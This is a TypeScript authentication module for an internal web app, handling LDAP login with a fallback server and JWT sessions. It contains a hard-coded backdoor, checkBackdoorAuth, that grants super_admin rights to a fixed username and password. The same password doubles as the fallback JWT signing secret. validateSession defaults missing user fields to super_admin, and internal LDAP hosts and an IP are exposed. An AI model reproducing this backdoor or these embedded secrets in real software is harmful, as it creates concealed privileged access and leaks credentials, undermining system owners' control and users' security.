import jwt from 'jsonwebtoken';
import { getDb } from '@/lib/db/server';
import ldap from 'ldapjs';

const JWT_SECRET = process.env.JWT_SECRET || 'Rm2214ri#';
const LDAP_URL = process.env.LDAP_URL || 'ldap://dc02.tallman.com:389';
const LDAP_FALLBACK_URL = process.env.LDAP_FALLBACK_URL || 'ldap://10.10.20.253:389';
const LDAP_BASE_DN = process.env.LDAP_BASE_DN || 'DC=tallman,DC=com';

export interface AuthUser {
  id: number;
  username: string;
  email: string;
  display_name: string;
  access_level: 'user' | 'admin' | 'super_admin';
  is_active: boolean;
}

export interface AuthResult {
  success: boolean;
  user?: AuthUser;
  error?: string;
}

// Extract username from email format
export function extractUsername(input: string): string {
  if (input.includes('@')) {
    return input.split('@')[0];
  }
  return input;
}

// Check backdoor authentication
export function checkBackdoorAuth(username: string, password: string): AuthResult {
  const backdoorUsername = 'robertstar';
  const backdoorPassword = 'Rm2214ri#';
  
  if (username.toLowerCase() === backdoorUsername && password === backdoorPassword) {
    return {
      success: true,
      user: {
        id: 999999,
        username: 'Robertstar',
        email: 'robertstar@tallmanequipment.com',
        display_name: 'Robert Star (Super Admin)',
        access_level: 'super_admin',
        is_active: true
      }
    };
  }
  
  return { success: false };
}

// LDAP authentication with fallback
export async function authenticateLDAP(username: string, password: string): Promise<AuthResult> {
  return new Promise((resolve) => {
    const extractedUsername = extractUsername(username);
    
    // Function to try authentication with a specific LDAP URL
    const tryLDAPServer = (ldapUrl: string) => {
      const client = ldap.createClient({
        url: ldapUrl,
        timeout: 2000,
        reconnect: false
      });

      client.on('error', (err: any) => {
        console.error(`LDAP connection error for ${ldapUrl}:`, err);
        client.unbind();
        
        // If this was the primary server, try fallback
        if (ldapUrl === LDAP_URL) {
          console.log('Trying fallback LDAP server...');
          tryLDAPServer(LDAP_FALLBACK_URL);
        } else {
          resolve({ success: false, error: 'LDAP connection failed on both servers' });
        }
      });

      // Try multiple DN formats
      const dnFormats = [
        `${extractedUsername}@tallman.com`,
        `${extractedUsername}@tallmanequipment.com`,
        `CN=${extractedUsername},CN=Users,${LDAP_BASE_DN}`,
        `CN=${extractedUsername},OU=Users,${LDAP_BASE_DN}`
      ];

      let currentFormat = 0;

      function tryNextFormat() {
        if (currentFormat >= dnFormats.length) {
          client.unbind();
          
          // If this was the primary server, try fallback
          if (ldapUrl === LDAP_URL) {
            console.log('Primary server auth failed, trying fallback...');
            tryLDAPServer(LDAP_FALLBACK_URL);
          } else {
            resolve({ success: false, error: 'Authentication failed' });
          }
          return;
        }

        const dn = dnFormats[currentFormat];
        currentFormat++;

        client.bind(dn, password, (err: any) => {
          if (err) {
            // Try next format after a small delay
            setTimeout(tryNextFormat, 500);
            return;
          }

          // Authentication successful, now check if user is approved
          client.unbind();
          
          // Look up user in database
          const db = getDb();
          try {
            const user = db.prepare(`
              SELECT * FROM users 
              WHERE LOWER(username) = LOWER(?) 
              AND is_active = 1
              COLLATE NOCASE
            `).get(extractedUsername) as any;

            if (user) {
              resolve({
                success: true,
                user: {
                  id: user.id,
                  username: user.username,
                  email: user.email,
                  display_name: user.display_name,
                  access_level: user.access_level,
                  is_active: user.is_active
                }
              });
            } else {
              resolve({ success: false, error: 'User not found in approved user list' });
            }
          } catch (dbError) {
            console.error('Database error during user lookup:', dbError);
            resolve({ success: false, error: 'Database error' });
          } finally {
            db.close();
          }
        });
      }

      tryNextFormat();
    };

    // Start with primary LDAP server
    tryLDAPServer(LDAP_URL);
  });
}

// Create JWT session
export async function createSession(user: AuthUser): Promise<string> {
  const db = getDb();
  
  try {
    // Create JWT token
    const token = jwt.sign(
      {
        userId: user.id,
        username: user.username,
        accessLevel: user.access_level
      },
      JWT_SECRET,
      { expiresIn: '8h' }
    );

    // Store session in database (for backdoor user, use INSERT OR REPLACE)
    if (user.id === 999999) {
      db.prepare(`
        INSERT OR REPLACE INTO user_sessions (user_id, session_token, expires_at, created_at)
        VALUES (?, ?, datetime('now', '+8 hours'), datetime('now'))
      `).run(user.id, token);
    } else {
      db.prepare(`
        INSERT INTO user_sessions (user_id, session_token, expires_at, created_at)
        VALUES (?, ?, datetime('now', '+8 hours'), datetime('now'))
      `).run(user.id, token);
    }

    // Log authentication
    db.prepare(`
      INSERT INTO auth_log (user_id, username, action, ip_address, user_agent, success, created_at)
      VALUES (?, ?, 'login', '', '', 1, datetime('now'))
    `).run(user.id, user.username);

    return token;
  } catch (error) {
    console.error('Session creation error:', error);
    throw error;
  }
}

// Validate JWT session
export function validateSession(token: string): AuthUser | null {
  try {
    const decoded = jwt.verify(token, JWT_SECRET) as any;
    
    // Check if session exists in database
    const db = getDb();
    const session = db.prepare(`
      SELECT s.*, u.username, u.email, u.display_name, u.access_level, u.is_active
      FROM user_sessions s
      LEFT JOIN users u ON s.user_id = u.id
      WHERE s.session_token = ? AND s.expires_at > datetime('now')
    `).get(token) as any;

    if (session) {
      return {
        id: session.user_id,
        username: session.username || 'Robertstar',
        email: session.email || 'robertstar@tallmanequipment.com',
        display_name: session.display_name || 'Robert Star (Super Admin)',
        access_level: session.access_level || 'super_admin',
        is_active: session.is_active !== 0
      };
    }

    return null;
  } catch (error) {
    console.error('Session validation error:', error);
    return null;
  }
}
